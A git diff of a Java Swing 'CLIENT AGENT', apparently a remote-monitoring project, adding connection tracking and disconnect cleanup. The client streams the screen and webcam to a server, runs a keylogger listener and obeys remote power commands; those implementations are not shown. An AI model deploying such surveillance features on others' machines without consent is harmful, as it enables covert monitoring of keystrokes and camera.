@@ -10,7 +10,6 @@ import java.net.ServerSocket;
 import java.net.Socket;
 import java.net.UnknownHostException;
 import java.util.concurrent.LinkedBlockingQueue;
-
 import javax.swing.*;
 import network.Screen;
 import network.SocketClient;
@@ -20,6 +19,10 @@ public class UIClient extends JFrame {
 
     private SocketClient socketClient;
     private ServerSocket keylogServerSocket;;
+
+    private volatile boolean isConnected = false;  // Track connection state
+    private Screen screenStreamService = null;      // Lưu reference
+    private java.util.List<Thread> activeThreads = new java.util.ArrayList<>();  // Track threads
 
     private final static String titleString="CLIENT AGENT";
     private final static int width=450;
@@ -230,15 +233,19 @@ public class UIClient extends JFrame {
         connectButton.addActionListener(e -> {
             if (socketClient != null && socketClient.isConnected()) {
                 // Nếu đã kết nối rồi thì thực hiện ngắt kết nối
-                socketClient.disconnect();
+                isConnected = false;
                 socketClient.disconnect();
 
-                // THÊM ĐOẠN NÀY
                 try {
                     if (keylogServerSocket != null && !keylogServerSocket.isClosed()) {
                         keylogServerSocket.close();
                     }
                 } catch (Exception ignored) {}
+
+                if (screenStreamService != null) {
+                    screenStreamService.stop();
+                }
+
 
                 statusLabel.setText("● STATUS: DISCONNECTED");
                 statusLabel.setForeground(MUTED);
@@ -254,14 +261,17 @@ public class UIClient extends JFrame {
             statusLabel.setForeground(Color.YELLOW);
             connectButton.setEnabled(false); // Khóa nút bấm tạm thời để tránh user click đúp
 
+            
+
             // Tạo một luồng riêng để đi kết nối mạng, tránh làm đơ giao diện
             new Thread(() -> {
                 socketClient = new SocketClient();
-                boolean isConnected = socketClient.connectServer(ip, port);
+                boolean Connected = socketClient.connectServer(ip, port);
         
                 // Dùng SwingUtilities để cập nhật lại giao diện sau khi kết nối xong
                 SwingUtilities.invokeLater(() -> {
-                    if (isConnected) {
+                    if (Connected) {
+                        isConnected = true;
                         statusLabel.setText("● STATUS: CONNECTED TO " + ip);
                         statusLabel.setForeground(Color.GREEN);
                         connectButton.setText("DISCONNECT");
@@ -273,7 +283,7 @@ public class UIClient extends JFrame {
                         // TODO: Kích hoạt CommandReceiver để ngồi hóng lệnh
                         
 
-                        Screen screenStreamService = new Screen(socketClient.getDos());
+                        screenStreamService = new Screen(socketClient.getDos());
                         screenStreamService.start();
                         startKeyloggerListener();
                     } else {
@@ -365,9 +375,10 @@ public class UIClient extends JFrame {
     }
 
     private void startServerMessageListener() {
-        new Thread(() -> {
-            try {
-                while (socketClient != null && socketClient.isConnected()) {
+    new Thread(() -> {
+        try {
+            while (socketClient != null && socketClient.isConnected()) {
+                try {
                     String message = socketClient.getDis().readUTF();
                     System.out.println("[CLIENT] Received: " + message);
 
@@ -376,23 +387,30 @@ public class UIClient extends JFrame {
                         SwingUtilities.invokeLater(() -> {
                             JOptionPane.showMessageDialog(UIClient.this, text, "Broadcast", JOptionPane.INFORMATION_MESSAGE);
                         });
-                    } else if (message.startsWith("POWER|")) {
+                    } 
+                    else if (message.startsWith("POWER|")) {
                         String cmdType = message.substring("POWER|".length());
                         System.out.println("[CLIENT] Nhận lệnh điều khiển nguồn: " + cmdType);
                         executePowerCommand(cmdType);
                     }
                     else if (message.equals("WEBCAM_START")) {
-                        new Thread(() -> {
+                        Thread webcamThread = new Thread(() -> {
                             try {
+                                if (!isConnected) return;
+                                
                                 Socket ws = new Socket(socketClient.getServerIp(), 1413);
                                 DataOutputStream dos = new DataOutputStream(ws.getOutputStream());
                                 dos.writeUTF(socketClient.getClientName());
                                 dos.flush();
-                                new features.WebcamClientDemo().startWebcamStream(ws);
+                                
+                                features.WebcamClientDemo webcam = new features.WebcamClientDemo();
+                                webcam.startWebcamStream(ws);
                             } catch (Exception ex) {
                                 System.out.println("[WEBCAM-CLIENT] ERROR: " + ex.getMessage());
                             }
-                        }).start();
+                        });
+                        webcamThread.start();
+                        activeThreads.add(webcamThread);  // ← Track it
                     }
                     else if (message.equals("TASK_MANAGER_START")) {
                         new Thread(() -> {
@@ -418,12 +436,21 @@ public class UIClient extends JFrame {
                     else {
                         System.out.println("[CLIENT] Unknown: " + message);
                     }
+                    
+                } catch (java.io.EOFException e) {
+                    System.out.println("[CLIENT] Server closed connection");
+                    handleServerDisconnect();
+                    break;
                 }
-            } catch (Exception e) {
-                System.out.println("[CLIENT] Stopped: " + e.getMessage());
             }
-        }).start();
-    }
+        } catch (Exception e) {
+            System.out.println("[CLIENT] Listener error: " + e.getMessage());
+            handleServerDisconnect();
+        }
+    }).start();
+}
+
+        
     private void executePowerCommand(String type) {
         try {
             String os = System.getProperty("os.name").toLowerCase();
@@ -453,6 +480,45 @@ public class UIClient extends JFrame {
         }
     }
 
+
+    private void handleServerDisconnect() {
+    System.out.println("[CLIENT] Server disconnected, resetting UI...");
+    isConnected = false;
+    
+    SwingUtilities.invokeLater(() -> {
+        
+        
+        if (screenStreamService != null) {
+            screenStreamService.stop();
+            screenStreamService = null;
+        }
+
+        for (Thread t : activeThreads) {
+            if (t != null && t.isAlive()) {
+                t.interrupt();  // Interrupt thread
+            }
+        }
+        activeThreads.clear();
+        
+        try {
+            if (keylogServerSocket != null && !keylogServerSocket.isClosed()) {
+                keylogServerSocket.close();
+            }
+        } catch (Exception ignored) {}
+
+        statusLabel.setText("● STATUS: DISCONNECTED");
+        statusLabel.setForeground(MUTED);
+        
+        connectButton.setText("CONNECT TO SERVER");
+        connectButton.setEnabled(true);
+
+        if (socketClient != null) {
+            socketClient.disconnect();
+        }
+        
+        System.out.println("[CLIENT] UI reset complete");
+    });
+}
     // Hàm Main khởi động để test thử UI
     public void run(){
         SwingUtilities.invokeLater(() -> {
